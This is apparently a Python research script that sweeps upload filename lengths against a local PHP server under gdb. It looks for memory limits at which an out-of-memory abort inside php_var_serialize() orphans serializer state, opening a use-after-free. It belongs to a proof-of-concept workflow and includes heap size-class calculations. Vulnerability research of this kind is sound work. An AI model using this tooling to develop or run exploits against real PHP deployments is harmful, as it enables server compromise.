#!/usr/bin/env python3
"""sweep_arm.py — find which filename length orphans BG(serialize) at a given memory_limit.

The condition is narrower than "the request dies on memory_limit". It must die
*inside* php_var_serialize(), i.e. after php_var_serialize_init() set level=1 and
before php_var_serialize_destroy() reset it to 0. If the OOM lands after the
flush completed, the context was already freed properly and there is nothing to
reuse -- which is what happens at 256M / 64 MB.

Signal used: the gdb trace of php_var_serialize_init/destroy. For each size we
arm, then immediately fire, and look at the level the *fire* starts with:
  fire init level=1  -> the arm orphaned state  (UAF possible)
  fire init level=0  -> the arm cleaned up properly (no UAF)

Usage:
  python3 sweep_arm.py --limit 256M --sizes 48000000,56000000,64000000,72000000
  python3 sweep_arm.py --limit 8M --sizes 1900000,2000000,2100000
"""
import argparse
import os
import re
import shutil
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import poc  # noqa: E402


def one(limit, fn_len, port, timeout=90, docroot=None):
    sess = f"/tmp/sweep-sess-{port}"
    shutil.rmtree(sess, ignore_errors=True)
    os.makedirs(sess, exist_ok=True)
    log = f"/tmp/sweep-{port}.log"
    args = ["gdb", "-q", "-batch", "-x", f"{HERE}/trace.gdb", "--args", "php", "-n",
            "-d", "post_max_size=400M", "-d", "upload_max_filesize=400M",
            "-d", f"session.save_path={sess}", "-d", f"memory_limit={limit}",
            "-d", "session.upload_progress.enabled=1", "-d", "display_errors=1",
            "-S", f"127.0.0.1:{port}", "-t", docroot or HERE]
    fh = open(log, "w")
    proc = subprocess.Popen(args, stdout=fh, stderr=subprocess.STDOUT, cwd=docroot or HERE)
    time.sleep(3.0)
    try:
        r1 = poc.post(port, poc.multipart("a1", fn_len, 1000), "a1", timeout=timeout)
        oom = poc.oom_in(r1)
        time.sleep(0.3)
        r2 = poc.post(port, poc.multipart("f1", 10, 100), "f1", timeout=timeout)
        fire = poc.first_line(r2)
    except OSError as exc:
        oom, fire = f"worker gone: {exc}", "n/a"
    finally:
        time.sleep(0.3)
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        fh.close()

    hits = re.findall(r"HIT (init|destroy) +level=(\d+)", open(log, errors="replace").read())
    # the fire is the request that starts after the arm's fatal: its init line
    # carries the level the arm left behind
    levels = [int(lv) for kind, lv in hits if kind == "init"]
    orphaned = 1 in levels[1:] if len(levels) > 1 else None
    return dict(fn_len=fn_len, oom=oom, fire=fire, hits=hits, orphaned=orphaned)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--limit", default="256M")
    ap.add_argument("--sizes", required=True)
    ap.add_argument("--port", type=int, default=9500)
    ap.add_argument("--docroot", default=None,
                    help="serve from here instead of the lab dir; length picks the size class "
                         "of SCRIPT_FILENAME (25 + len(path) bytes)")
    a = ap.parse_args()
    if a.docroot:
        os.makedirs(a.docroot, exist_ok=True)
        if not os.path.exists(os.path.join(a.docroot, "probe.php")):
            shutil.copy(os.path.join(HERE, "probe.php"), a.docroot)
        sf = len(a.docroot) + len("/probe.php")
        print(f"docroot={a.docroot}  SCRIPT_FILENAME={sf} chars  "
              f"zend_string alloc={25+sf} -> {((25+sf+7)//8)*8}-byte bin\n")
    else:
        print(f"memory_limit={a.limit}\n")
    for i, n in enumerate([int(x) for x in a.sizes.split(",") if x.strip()]):
        r = one(a.limit, n, a.port + i, docroot=a.docroot)
        trace = " ".join(f"{k[0]}{lv}" for k, lv in r["hits"])
        print(f"{n/1e6:6.1f} MB  oom={str(r['oom'])[:44]:<46} fire={r['fire'][:16]:<16} "
              f"trace=[{trace}]  -> orphaned={r['orphaned']}")


if __name__ == "__main__":
    main()
